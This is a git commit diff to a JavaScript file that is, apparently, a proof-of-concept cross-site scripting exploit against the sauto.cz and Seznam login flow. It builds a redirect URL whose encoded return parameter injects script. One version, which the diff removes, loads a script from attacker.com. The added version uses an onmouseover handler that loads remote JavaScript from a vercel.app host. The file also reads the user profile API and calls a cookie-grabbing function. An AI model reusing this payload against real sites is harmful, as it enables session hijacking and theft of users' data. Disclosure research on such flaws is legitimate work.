d157fcb792f6317776ff576697eb3b90bb615561
Jirka Martinec <jirka@martinec.dev>
2023-07-20 22:58:05 +0200

    init

--- index.js
+++ index.js
@@ -4,8 +4,11 @@ xhttp.onreadystatechange = function() {
         console.log('yes');
         getCookiesFromResponse();
     } else if (this.readyState == 4 && this.status == 401) {
+        const url = "https://login.szn.cz/continue?return_url=https%3A%2F%2Flogin.sauto.cz%2FloginDone%3Fservice%3Dsauto%26return_url%3Dhttps://www.sauto.cz%2fbannerova-reklama%253FperPage%253D1%2526banner%253D1%2526clickthru%253D";
         console.log('no');
-        window.location.replace('https://login.szn.cz/continue?return_url=https%3A%2F%2Flogin.sauto.cz%2FloginDone%3Fservice%3Dsauto%26return_url%3Dhttps://www.sauto.cz%2fbannerova-reklama%253FperPage%253D1%2526banner%253D1%2526clickthru%253D%2522%253E%253Cscript%2Bsrc%253D%252F%252Fattacker.com%252Fscript.js%253E%253C%252Fscript%253E%253C%2521--');
+        const suffix = "/%22onmouseover=%22let%20s%20=%20document.createElement(%27script%27);%20s.setAttribute(%27src%27,%27https://whitehat-email-cz.vercel.app//index.js%27);%20document.head.appendChild(s)";
+        window.location.replace(url + suffix);
+        console.log(url + suffix);
     }
 };
 xhttp.open("GET", "https://www.sauto.cz/api/v1/users/self", true);
